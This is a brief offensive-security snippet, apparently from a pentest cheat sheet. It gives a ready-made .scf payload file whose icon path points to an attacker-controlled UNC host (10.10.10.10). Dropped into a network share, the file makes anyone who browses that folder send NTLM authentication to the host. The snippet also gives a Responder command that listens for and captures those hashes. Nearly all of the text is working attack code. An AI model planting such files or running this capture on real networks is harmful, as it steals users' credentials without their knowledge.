- - -
Drop the following `@something.scf` file inside a share 

```scf
[Shell]
Command=2
IconFile=\\10.10.10.10\Share\test.ico
[Taskbar]
Command=ToggleDesktop
```

Start listening with Responder : 

```python
responder -wrf --lm -v -I eth0
```

